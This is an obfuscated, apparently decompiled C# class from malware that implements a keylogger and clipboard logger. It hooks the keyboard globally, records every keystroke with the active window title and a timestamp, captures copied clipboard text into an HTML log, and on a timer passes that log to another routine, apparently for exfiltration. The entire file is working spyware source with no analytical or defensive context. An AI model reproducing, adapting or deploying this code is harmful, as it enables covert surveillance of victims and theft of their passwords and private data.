using System;
using System.Runtime.CompilerServices;
using System.Security;
using System.Text;
using System.Threading;
using System.Timers;
using System.Windows.Forms;
using ppkr;

namespace X5CZaoh;

public class gkgI5YrQv
{
	private readonly POq2Ux _keyboardHook;

	private readonly myVGu _clipboardHook;

	private readonly System.Timers.Timer LogTimer;

	private string KeylogText;

	private readonly object _lock = new object();

	private string activeWindowTitle;

	private IntPtr activeWindowHandle;

	private int activeWindowPid;

	private string lastTitle;

	private string LastCopiedText = "";

	[CompilerGenerated]
	private bool IsRunning__BackingField;

	public bool WrB
	{
		[CompilerGenerated]
		get
		{
			return IsRunning__BackingField;
		}
		[CompilerGenerated]
		private set
		{
			IsRunning__BackingField = value;
		}
	}

	public bool irGsssdzay
	{
		get
		{
			//IL_0000: Unknown result type (might be due to invalid IL or missing references)
			//IL_000a: Unknown result type (might be due to invalid IL or missing references)
			//IL_000c: Invalid comparison between Unknown and I4
			return (Control.ModifierKeys & 0x10000) != 0;
		}
	}

	public bool cbT
	{
		get
		{
			//IL_0000: Unknown result type (might be due to invalid IL or missing references)
			//IL_000a: Unknown result type (might be due to invalid IL or missing references)
			//IL_000c: Invalid comparison between Unknown and I4
			return (Control.ModifierKeys & 0x40000) != 0;
		}
	}

	public bool _0Xe
	{
		get
		{
			//IL_0000: Unknown result type (might be due to invalid IL or missing references)
			//IL_000a: Unknown result type (might be due to invalid IL or missing references)
			//IL_000c: Invalid comparison between Unknown and I4
			return (Control.ModifierKeys & 0x20000) != 0;
		}
	}

	public bool A3A2dMPoYX
	{
		[SecuritySafeCritical]
		get
		{
			return (gVe3wBP.GetKeyState(20) & 1) != 0;
		}
	}

	public gkgI5YrQv()
	{
		_keyboardHook = new POq2Ux();
		_keyboardHook.KeyDown += Lh6;
		if (dBDNalx6.EnableClipboardLogger)
		{
			_clipboardHook = new myVGu();
			_clipboardHook.Changed += CftpaX4hc;
			_clipboardHook._9YK3v9e7pC();
		}
		LogTimer = new System.Timers.Timer();
		LogTimer.Elapsed += NSYXwNfxcZ;
		LogTimer.Interval = 60000 * dBDNalx6.KeyloggerInterval;
	}

	public void pKsga()
	{
		int num = 0;
		do
		{
			if (num == 2)
			{
				WrB = true;
				num = 3;
			}
			if (num == 1)
			{
				_keyboardHook.kHSOsUTD();
				num = 2;
			}
			if (num == 3)
			{
				LogTimer.Start();
				num = 4;
			}
			if (num == 0)
			{
				num = 1;
			}
		}
		while (num != 4);
	}

	public void JHdi()
	{
		int num = 0;
		do
		{
			if (num == 3)
			{
				LogTimer.Stop();
				num = 4;
			}
			if (num == 2)
			{
				WrB = false;
				num = 3;
			}
			if (num == 1)
			{
				_keyboardHook.egyjbjUKaDi();
				num = 2;
			}
			if (num == 0)
			{
				num = 1;
			}
		}
		while (num != 4);
	}

	private void NSYXwNfxcZ(object DgGA, ElapsedEventArgs rRm)
	{
		int num = 0;
		bool lockTaken = default;
		object obj = default;
		while (true)
		{
			if (num == 1)
			{
				if (string.IsNullOrEmpty(KeylogText))
				{
					break;
				}
				num = 2;
			}
			if (num == 2)
			{
				lockTaken = false;
				num = 3;
			}
			if (num == 0)
			{
				num = 1;
			}
			if (num != 3)
			{
				continue;
			}
			try
			{
				Monitor.Enter(obj = _lock, ref lockTaken);
				HaT.Ad9ZQiXJ(KeylogText);
				KeylogText = "";
				break;
			}
			finally
			{
				if (lockTaken)
				{
					Monitor.Exit(obj);
				}
			}
		}
	}

	private string n9W57j()
	{
		int num = 0;
		StringBuilder stringBuilder = default;
		int num2 = default;
		do
		{
			switch (num)
			{
			case 6:
				return stringBuilder.ToString();
			case 3:
				num2 = gVe3wBP.GetWindowTextLength(activeWindowHandle) + 1;
				num = 4;
				break;
			}
			if (num == 5)
			{
				if (gVe3wBP.GetWindowText(activeWindowHandle, stringBuilder, num2) <= 0)
				{
					break;
				}
				num = 6;
			}
			if (num == 1)
			{
				activeWindowHandle = gVe3wBP.GetForegroundWindow();
				num = 2;
			}
			if (num == 4)
			{
				stringBuilder = new StringBuilder(num2);
				num = 5;
			}
			if (num == 2)
			{
				gVe3wBP.GetWindowThreadProcessId(activeWindowHandle, ref activeWindowPid);
				num = 3;
			}
			if (num == 0)
			{
				num = 1;
			}
		}
		while (num != 7);
		return null;
	}

	private void RGK5g6qkR()
	{
		int num = 0;
		do
		{
			if (num == 4)
			{
				KeylogText += "<br>";
				num = 5;
			}
			if (num == 6)
			{
				KeylogText += lastTitle;
				num = 7;
			}
			if (num == 3)
			{
				if (!(!KeylogText.EndsWith("<br>") & !KeylogText.EndsWith("<hr>")))
				{
					goto IL_0140;
				}
				num = 4;
			}
			if (num == 1)
			{
				if (!(lastTitle != activeWindowTitle))
				{
					break;
				}
				num = 2;
			}
			if (num == 2)
			{
				if (string.IsNullOrEmpty(KeylogText))
				{
					goto IL_0140;
				}
				num = 3;
			}
			if (num == 5)
			{
				goto IL_0140;
			}
			goto IL_01cb;
			IL_0140:
			lastTitle = "<b>[ " + activeWindowTitle + "]</b> (" + DateTime.Now.ToString() + ")<br>";
			num = 6;
			goto IL_01cb;
			IL_01cb:
			if (num == 7)
			{
				lastTitle = activeWindowTitle;
				num = 8;
			}
			if (num == 0)
			{
				num = 1;
			}
		}
		while (num != 8);
	}

	private void Lh6(Keys PFzcGMZaIb0)
	{
		//IL_006d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0076: Invalid comparison between Unknown and I4
		//IL_0761: Unknown result type (might be due to invalid IL or missing references)
		//IL_076a: Invalid comparison between Unknown and I4
		//IL_0337: Unknown result type (might be due to invalid IL or missing references)
		//IL_0340: Invalid comparison between Unknown and I4
		//IL_0c92: Unknown result type (might be due to invalid IL or missing references)
		//IL_0c9b: Invalid comparison between Unknown and I4
		//IL_00e6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ef: Invalid comparison between Unknown and I4
		//IL_0387: Unknown result type (might be due to invalid IL or missing references)
		//IL_0390: Invalid comparison between Unknown and I4
		//IL_0789: Unknown result type (might be due to invalid IL or missing references)
		//IL_0792: Invalid comparison between Unknown and I4
		//IL_010e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0117: Invalid comparison between Unknown and I4
		//IL_0425: Unknown result type (might be due to invalid IL or missing references)
		//IL_042e: Invalid comparison between Unknown and I4
		//IL_120b: Unknown result type (might be due to invalid IL or missing references)
		//IL_1214: Invalid comparison between Unknown and I4
		//IL_035f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0368: Invalid comparison between Unknown and I4
		//IL_051b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0524: Invalid comparison between Unknown and I4
		//IL_0f1a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0f23: Invalid comparison between Unknown and I4
		//IL_0ff2: Unknown result type (might be due to invalid IL or missing references)
		//IL_0ffb: Invalid comparison between Unknown and I4
		//IL_0263: Unknown result type (might be due to invalid IL or missing references)
		//IL_026c: Invalid comparison between Unknown and I4
		//IL_0cc8: Unknown result type (might be due to invalid IL or missing references)
		//IL_0cd1: Expected I4, but got Unknown
		//IL_0893: Unknown result type (might be due to invalid IL or missing references)
		//IL_089c: Invalid comparison between Unknown and I4
		//IL_02f4: Unknown result type (might be due to invalid IL or missing references)
		//IL_02fd: Invalid comparison between Unknown and I4
		//IL_0def: Unknown result type (might be due to invalid IL or missing references)
		//IL_0df8: Invalid comparison between Unknown and I4
		//IL_0184: Unknown result type (might be due to invalid IL or missing references)
		//IL_018d: Invalid comparison between Unknown and I4
		//IL_03af: Unknown result type (might be due to invalid IL or missing references)
		//IL_03b8: Invalid comparison between Unknown and I4
		//IL_0d70: Unknown result type (might be due to invalid IL or missing references)
		//IL_0d79: Invalid comparison between Unknown and I4
		//IL_105d: Unknown result type (might be due to invalid IL or missing references)
		//IL_1066: Invalid comparison between Unknown and I4
		//IL_08f1: Unknown result type (might be due to invalid IL or missing references)
		//IL_08fa: Invalid comparison between Unknown and I4
		//IL_045b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0464: Expected I4, but got Unknown
		//IL_10de: Unknown result type (might be due to invalid IL or missing references)
		//IL_10e7: Invalid comparison between Unknown and I4
		//IL_09cd: Unknown result type (might be due to invalid IL or missing references)
		//IL_09d6: Invalid comparison between Unknown and I4
		//IL_04f3: Unknown result type (might be due to invalid IL or missing references)
		//IL_04fc: Invalid comparison between Unknown and I4
		//IL_101a: Unknown result type (might be due to invalid IL or missing references)
		//IL_1023: Invalid comparison between Unknown and I4
		//IL_0d48: Unknown result type (might be due to invalid IL or missing references)
		//IL_0d51: Invalid comparison between Unknown and I4
		//IL_086b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0874: Invalid comparison between Unknown and I4
		//IL_0584: Unknown result type (might be due to invalid IL or missing references)
		//IL_058d: Expected I4, but got Unknown
		//IL_10a8: Unknown result type (might be due to invalid IL or missing references)
		//IL_10b1: Invalid comparison between Unknown and I4
		//IL_10b3: Unknown result type (might be due to invalid IL or missing references)
		//IL_10bc: Invalid comparison between Unknown and I4
		//IL_0e50: Unknown result type (might be due to invalid IL or missing references)
		//IL_0e59: Invalid comparison between Unknown and I4
		//IL_0a2e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a37: Invalid comparison between Unknown and I4
		//IL_0b0c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b15: Invalid comparison between Unknown and I4
		//IL_0b1f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b28: Invalid comparison between Unknown and I4
		//IL_0b32: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b3b: Invalid comparison between Unknown and I4
		//IL_0b64: Unknown result type (might be due to invalid IL or missing references)
		//IL_0baa: Unknown result type (might be due to invalid IL or missing references)
		//IL_072f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0738: Expected I4, but got Unknown
		int num = 0;
		do
		{
			switch (num)
			{
			case 80:
				return;
			case 31:
				KeylogText += "{KEYLEFT}";
				num = 32;
				break;
			}
			if (num == 24)
			{
				goto IL_006d;
			}
			goto IL_0084;
			IL_04f3:
			if ((int)PFzcGMZaIb0 == 112)
			{
				num = 61;
				goto IL_050a;
			}
			goto IL_0d48;
			IL_0084:
			if (num == 5 || num == 35 || num == 103)
			{
				break;
			}
			if (num == 45)
			{
				goto IL_00e6;
			}
			goto IL_00fd;
			IL_0d48:
			if ((int)PFzcGMZaIb0 != 113)
			{
				goto IL_086b;
			}
			num = 64;
			goto IL_0d5f;
			IL_006d:
			if ((int)PFzcGMZaIb0 == 38)
			{
				num = 25;
				goto IL_0084;
			}
			goto IL_0761;
			IL_0761:
			if ((int)PFzcGMZaIb0 != 40)
			{
				goto IL_0337;
			}
			num = 28;
			goto IL_0778;
			IL_00fd:
			if (num == 3)
			{
				if ((int)PFzcGMZaIb0 != 8)
				{
					goto IL_0f11;
				}
				num = 4;
			}
			if (num == 82)
			{
				KeylogText += "{F8}";
				num = 83;
			}
			if (num == 41)
			{
				break;
			}
			if (num == 54)
			{
				goto IL_0184;
			}
			goto IL_019b;
			IL_101a:
			if ((int)PFzcGMZaIb0 != 122)
			{
				goto IL_0e50;
			}
			num = 91;
			goto IL_1031;
			IL_0337:
			if ((int)PFzcGMZaIb0 == 37)
			{
				num = 31;
				goto IL_034e;
			}
			goto IL_0c92;
			IL_0c4b:
			if (num == 86 || num == 47)
			{
				break;
			}
			if (num == 33)
			{
				goto IL_0c92;
			}
			goto IL_0ca9;
			IL_0c92:
			if ((int)PFzcGMZaIb0 != 39)
			{
				goto IL_0387;
			}
			num = 34;
			goto IL_0ca9;
			IL_0ca9:
			if (num == 111)
			{
				KeylogText += MMO5dZMfNq((uint)(int)PFzcGMZaIb0).ToLower();
				num = 112;
			}
			switch (num)
			{
			case 109:
				return;
			case 55:
				KeylogText += "{PageUp}";
				num = 56;
				break;
			}
			if (num == 63)
			{
				goto IL_0d48;
			}
			goto IL_0d5f;
			IL_086b:
			if ((int)PFzcGMZaIb0 != 114)
			{
				goto IL_035f;
			}
			num = 67;
			goto IL_0882;
			IL_019b:
			switch (num)
			{
			case 95:
				return;
			case 67:
				KeylogText += "{F3}";
				num = 68;
				break;
			}
			switch (num)
			{
			case 23:
				return;
			case 61:
				KeylogText += "{F1}";
				num = 62;
				break;
			}
			if (num == 17)
			{
				break;
			}
			if (num == 42)
			{
				goto IL_0263;
			}
			goto IL_027a;
			IL_1222:
			if (num == 76)
			{
				KeylogText += "{F6}";
				num = 77;
			}
			switch (num)
			{
			case 68:
				return;
			case 0:
				num = 1;
				break;
			}
			continue;
			IL_0d5f:
			if (num == 84)
			{
				goto IL_0d70;
			}
			goto IL_0d87;
			IL_0d87:
			if (num == 94)
			{
				KeylogText += "{F12}";
				num = 95;
			}
			if (num == 38)
			{
				break;
			}
			if (num == 9)
			{
				goto IL_0de6;
			}
			goto IL_0e09;
			IL_027a:
			switch (num)
			{
			case 65:
			case 112:
				return;
			case 70:
				KeylogText += "{F4}";
				num = 71;
				break;
			}
			if (num == 81)
			{
				goto IL_02f4;
			}
			goto IL_030b;
			IL_035f:
			if ((int)PFzcGMZaIb0 == 115)
			{
				num = 70;
				goto IL_0376;
			}
			goto IL_0893;
			IL_030b:
			if (num == 74)
			{
				break;
			}
			if (num == 30)
			{
				goto IL_0337;
			}
			goto IL_034e;
			IL_0387:
			if ((int)PFzcGMZaIb0 == 46)
			{
				num = 37;
				goto IL_039e;
			}
			goto IL_120b;
			IL_034e:
			if (num == 69)
			{
				goto IL_035f;
			}
			goto IL_0376;
			IL_0376:
			if (num == 36)
			{
				goto IL_0387;
			}
			goto IL_039e;
			IL_039e:
			if (num == 21)
			{
				goto IL_03af;
			}
			goto IL_03c6;
			IL_03c6:
			if (num == 58)
			{
				KeylogText += "{ENTER}";
				num = 59;
			}
			if (num == 56)
			{
				break;
			}
			if (num == 48)
			{
				goto IL_0425;
			}
			goto IL_043c;
			IL_0e09:
			if (num == 29 || num == 20)
			{
				break;
			}
			if (num == 93)
			{
				goto IL_0e50;
			}
			goto IL_0e67;
			IL_10cd:
			if (num == 87)
			{
				goto IL_10de;
			}
			goto IL_10f5;
			IL_10f5:
			if (num == 73)
			{
				KeylogText += "{F5}";
				num = 74;
			}
			switch (num)
			{
			case 59:
				return;
			case 79:
				KeylogText += "{F7}";
				num = 80;
				break;
			}
			switch (num)
			{
			case 11:
			case 50:
				return;
			case 7:
				KeylogText += "{ALT+TAB}";
				num = 8;
				break;
			}
			if (num == 89)
			{
				break;
			}
			if (num == 39)
			{
				goto IL_120b;
			}
			goto IL_1222;
			IL_043c:
			if (num == 108)
			{
				KeylogText += MMO5dZMfNq((uint)(int)PFzcGMZaIb0).ToUpper();
				num = 109;
			}
			if (num == 40)
			{
				KeylogText += "{END}";
				num = 41;
			}
			if (num == 85)
			{
				KeylogText += "{F9}";
				num = 86;
			}
			if (num == 60)
			{
				goto IL_04f3;
			}
			goto IL_050a;
			IL_0e67:
			if (num == 91)
			{
				KeylogText += "{F11}";
				num = 92;
			}
			if (num == 37)
			{
				KeylogText += "{DEL}";
				num = 38;
			}
			if (num == 49)
			{
				KeylogText += "{NumLock}";
				num = 50;
			}
			if (num == 6)
			{
				goto IL_0f11;
			}
			goto IL_0f34;
			IL_0893:
			if ((int)PFzcGMZaIb0 != 116)
			{
				goto IL_0789;
			}
			num = 73;
			goto IL_08aa;
			IL_0e50:
			if ((int)PFzcGMZaIb0 != 123)
			{
				goto IL_0a2e;
			}
			num = 94;
			goto IL_0e67;
			IL_0832:
			if (!A3A2dMPoYX & irGsssdzay)
			{
				num = 108;
				goto IL_085a;
			}
			goto IL_0c2a;
			IL_0789:
			if ((int)PFzcGMZaIb0 != 117)
			{
				goto IL_051b;
			}
			num = 76;
			goto IL_07a0;
			IL_0a2e:
			if ((int)PFzcGMZaIb0 == 32)
			{
				num = 97;
				goto IL_0a45;
			}
			goto IL_0af2;
			IL_050a:
			if (num == 78)
			{
				goto IL_051b;
			}
			goto IL_0532;
			IL_0532:
			if (num == 10)
			{
				KeylogText += "{ALT+F4}";
				num = 11;
			}
			if (num == 113)
			{
				goto IL_0576;
			}
			goto IL_05a5;
			IL_120b:
			if ((int)PFzcGMZaIb0 != 35)
			{
				goto IL_0263;
			}
			num = 40;
			goto IL_1222;
			IL_051b:
			if ((int)PFzcGMZaIb0 != 118)
			{
				goto IL_02f4;
			}
			num = 79;
			goto IL_0532;
			IL_05a5:
			switch (num)
			{
			case 8:
				return;
			case 16:
				KeylogText += "{ESC}";
				num = 17;
				break;
			}
			if (num == 52)
			{
				KeylogText += "{PageDown}";
				num = 53;
			}
			if (num == 64)
			{
				KeylogText += "{F2}";
				num = 65;
			}
			switch (num)
			{
			case 32:
			case 106:
				return;
			case 28:
				KeylogText += "{KEYDOWN}";
				num = 29;
				break;
			}
			switch (num)
			{
			case 14:
				return;
			case 101:
				KeylogText += "{CTRL}";
				num = 102;
				break;
			}
			if (num == 105)
			{
				KeylogText += MMO5dZMfNq((uint)(int)PFzcGMZaIb0).ToUpper();
				num = 106;
			}
			if (num == 27)
			{
				goto IL_0761;
			}
			goto IL_0778;
			IL_0f11:
			if (!(cbT & ((int)PFzcGMZaIb0 == 9)))
			{
				goto IL_0de6;
			}
			num = 7;
			goto IL_0f34;
			IL_0de6:
			if (cbT & ((int)PFzcGMZaIb0 == 115))
			{
				num = 10;
				goto IL_0e09;
			}
			goto IL_105d;
			IL_0263:
			if ((int)PFzcGMZaIb0 != 36)
			{
				goto IL_00e6;
			}
			num = 43;
			goto IL_027a;
			IL_0f34:
			if (num == 13)
			{
				KeylogText += "{TAB}";
				num = 14;
			}
			if (num == 43)
			{
				KeylogText += "{HOME}";
				num = 44;
			}
			switch (num)
			{
			case 44:
				return;
			case 1:
				activeWindowTitle = n9W57j();
				num = 2;
				break;
			}
			if (num == 51)
			{
				goto IL_0ff2;
			}
			goto IL_1009;
			IL_0576:
			KeylogText += MMO5dZMfNq((uint)(int)PFzcGMZaIb0).ToLower();
			num = 114;
			goto IL_05a5;
			IL_02f4:
			if ((int)PFzcGMZaIb0 == 119)
			{
				num = 82;
				goto IL_030b;
			}
			goto IL_0d70;
			IL_00e6:
			if ((int)PFzcGMZaIb0 == 45)
			{
				num = 46;
				goto IL_00fd;
			}
			goto IL_0425;
			IL_0425:
			if ((int)PFzcGMZaIb0 == 144)
			{
				num = 49;
				goto IL_043c;
			}
			goto IL_0ff2;
			IL_0af2:
			if (!(_0Xe & !cbT & ((int)PFzcGMZaIb0 != 18) & ((int)PFzcGMZaIb0 != 164) & ((int)PFzcGMZaIb0 != 165)))
			{
				goto IL_09f5;
			}
			num = 100;
			goto IL_0b53;
			IL_0778:
			if (num == 75)
			{
				goto IL_0789;
			}
			goto IL_07a0;
			IL_07a0:
			switch (num)
			{
			case 98:
				return;
			case 22:
				KeylogText += "{CAPSLOCK}";
				num = 23;
				break;
			}
			if (num == 88)
			{
				KeylogText += "{F10}";
				num = 89;
			}
			if (num == 107)
			{
				goto IL_0832;
			}
			goto IL_085a;
			IL_0ff2:
			if ((int)PFzcGMZaIb0 != 34)
			{
				goto IL_0184;
			}
			num = 52;
			goto IL_1009;
			IL_1031:
			if (num == 26)
			{
				break;
			}
			if (num == 12)
			{
				goto IL_105d;
			}
			goto IL_1074;
			IL_1009:
			if (num == 90)
			{
				goto IL_101a;
			}
			goto IL_1031;
			IL_085a:
			if (num == 66)
			{
				goto IL_086b;
			}
			goto IL_0882;
			IL_0882:
			if (num == 72)
			{
				goto IL_0893;
			}
			goto IL_08aa;
			IL_08aa:
			if (num == 53 || num == 92)
			{
				break;
			}
			if (num == 57)
			{
				goto IL_08f1;
			}
			goto IL_0908;
			IL_0d70:
			if ((int)PFzcGMZaIb0 == 120)
			{
				num = 85;
				goto IL_0d87;
			}
			goto IL_10de;
			IL_105d:
			if ((int)PFzcGMZaIb0 != 9)
			{
				goto IL_09cd;
			}
			num = 13;
			goto IL_1074;
			IL_0908:
			if (num == 4)
			{
				KeylogText += "{BACK}";
				num = 5;
			}
			if (num == 46)
			{
				KeylogText += "{Insert}";
				num = 47;
			}
			switch (num)
			{
			case 71:
				return;
			case 97:
				KeylogText += " ";
				num = 98;
				break;
			}
			if (num == 15)
			{
				goto IL_09cd;
			}
			goto IL_09e4;
			IL_09cd:
			if ((int)PFzcGMZaIb0 == 27)
			{
				num = 16;
				goto IL_09e4;
			}
			goto IL_10a8;
			IL_0184:
			if ((int)PFzcGMZaIb0 == 33)
			{
				num = 55;
				goto IL_019b;
			}
			goto IL_08f1;
			IL_1074:
			if (num == 2)
			{
				RGK5g6qkR();
				num = 3;
			}
			if (num == 18)
			{
				goto IL_10a8;
			}
			goto IL_10cd;
			IL_0c2a:
			if (!(A3A2dMPoYX & irGsssdzay))
			{
				goto IL_0576;
			}
			num = 111;
			goto IL_0c4b;
			IL_10de:
			if ((int)PFzcGMZaIb0 != 121)
			{
				goto IL_101a;
			}
			num = 88;
			goto IL_10f5;
			IL_09e4:
			if (num == 104)
			{
				goto IL_09f5;
			}
			goto IL_0a1d;
			IL_0a1d:
			if (num == 96)
			{
				goto IL_0a2e;
			}
			goto IL_0a45;
			IL_0a45:
			switch (num)
			{
			case 77:
				return;
			case 25:
				KeylogText += "{KEYUP}";
				num = 26;
				break;
			}
			switch (num)
			{
			case 83:
				return;
			case 19:
				KeylogText += "{Win}";
				num = 20;
				break;
			}
			if (num == 99)
			{
				goto IL_0af2;
			}
			goto IL_0b53;
			IL_08f1:
			if ((int)PFzcGMZaIb0 != 13)
			{
				goto IL_04f3;
			}
			num = 58;
			goto IL_0908;
			IL_10a8:
			if (!(((int)PFzcGMZaIb0 == 91) | ((int)PFzcGMZaIb0 == 92)))
			{
				goto IL_03af;
			}
			num = 19;
			goto IL_10cd;
			IL_0b53:
			if (num == 100)
			{
				if (((object)PFzcGMZaIb0).ToString().ToLower().Contains("control"))
				{
					break;
				}
				num = 101;
			}
			if (num == 102)
			{
				KeylogText += ((object)PFzcGMZaIb0).ToString();
				num = 103;
			}
			switch (num)
			{
			case 62:
				return;
			case 34:
				KeylogText += "{KEYRIGHT}";
				num = 35;
				break;
			}
			if (num == 110)
			{
				goto IL_0c2a;
			}
			goto IL_0c4b;
			IL_03af:
			if ((int)PFzcGMZaIb0 != 20)
			{
				goto IL_006d;
			}
			num = 22;
			goto IL_03c6;
			IL_09f5:
			if (!(A3A2dMPoYX & !irGsssdzay))
			{
				goto IL_0832;
			}
			num = 105;
			goto IL_0a1d;
		}
		while (num != 114);
	}

	private string MMO5dZMfNq(uint dqHzf)
	{
		int num = 0;
		do
		{
			switch (num)
			{
			case 1:
				try
				{
					StringBuilder stringBuilder = new StringBuilder();
					byte[] lpKeyState = new byte[255];
					if (!gVe3wBP.GetKeyboardState(lpKeyState))
					{
						return "";
					}
					IntPtr foregroundWindow = gVe3wBP.GetForegroundWindow();
					int lpdwProcessID = 0;
					int windowThreadProcessId = gVe3wBP.GetWindowThreadProcessId(foregroundWindow, ref lpdwProcessID);
					IntPtr keyboardLayout = gVe3wBP.GetKeyboardLayout(windowThreadProcessId);
					gVe3wBP.ToUnicodeEx(dqHzf, dqHzf, lpKeyState, stringBuilder, Convert.ToInt32(16), Convert.ToUInt32(0), keyboardLayout);
					return stringBuilder.ToString();
				}
				catch
				{
				}
				return ((object)(Keys)dqHzf).ToString();
			case 0:
				num = 1;
				break;
			}
		}
		while (num != 2);
		string result = default;
		return result;
	}

	private void CftpaX4hc(myVGu XS18sFpteW)
	{
		int num = 0;
		string text = default;
		bool lockTaken = default;
		object obj = default;
		while (true)
		{
			if (num == 8)
			{
				if (!(LastCopiedText != text))
				{
					break;
				}
				num = 9;
			}
			if (num == 5)
			{
				text = text.Replace("<", "&lt;");
				num = 6;
			}
			if (num == 10)
			{
				lockTaken = false;
				num = 11;
			}
			if (num == 1)
			{
				text = Clipboard.GetText();
				num = 2;
			}
			if (num == 6)
			{
				text = text.Replace(">", "&gt;");
				num = 7;
			}
			if (num == 7)
			{
				text = text.Replace("\"", "&quot;");
				num = 8;
			}
			switch (num)
			{
			case 3:
				return;
			case 9:
				LastCopiedText = text;
				num = 10;
				break;
			}
			if (num == 4)
			{
				goto IL_016b;
			}
			goto IL_018b;
			IL_018b:
			if (num == 2)
			{
				if (!string.IsNullOrEmpty(text))
				{
					goto IL_016b;
				}
				num = 3;
			}
			if (num == 0)
			{
				num = 1;
			}
			if (num != 11)
			{
				continue;
			}
			try
			{
				Monitor.Enter(obj = _lock, ref lockTaken);
				KeylogText = KeylogText + "<br><hr>Copied Text: <br>" + text + "<hr>";
				break;
			}
			finally
			{
				if (lockTaken)
				{
					Monitor.Exit(obj);
				}
			}
			IL_016b:
			text = text.Replace("&", "&amp;");
			num = 5;
			goto IL_018b;
		}
	}
}
